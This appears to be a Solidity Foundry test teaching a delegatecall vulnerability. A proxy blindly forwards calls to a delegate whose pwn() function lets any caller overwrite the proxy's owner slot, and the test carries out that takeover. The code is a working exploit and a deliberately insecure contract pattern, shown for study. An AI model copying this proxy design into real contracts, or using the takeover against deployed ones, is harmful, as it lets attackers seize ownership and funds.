// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "lib/forge-std/src/Test.sol";

contract Proxy {

  address public owner = address(0xdeadbeef);
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
  }

  fallback() external {
    (bool suc,) = address(delegate).delegatecall(msg.data); 
    require(suc, "Delegatecall failed");
  }
}

contract ContractTestDelegatecall is Test {
    Proxy proxy;
    Delegate DelegateContract;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        DelegateContract = new Delegate();             
        proxy = new Proxy(address(DelegateContract));  
        
          console.log("====================================");
          console.log("Alice address", alice);
          console.log("====================================");
          console.log("DelegationContract owner", proxy.owner());
          console.log("====================================");
        
          console.log("Change DelegationContract owner to Alice...");
          console.log("====================================");
        vm.prank(alice);   
        address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
        
          console.log("DelegationContract owner", proxy.owner());
          console.log("====================================");
          console.log("Exploit completed, proxy contract storage has been manipulated");
          console.log("====================================");
    }
}
 
contract Delegate {
  address public owner; 

  function pwn() public {
    owner = msg.sender;
  }
}


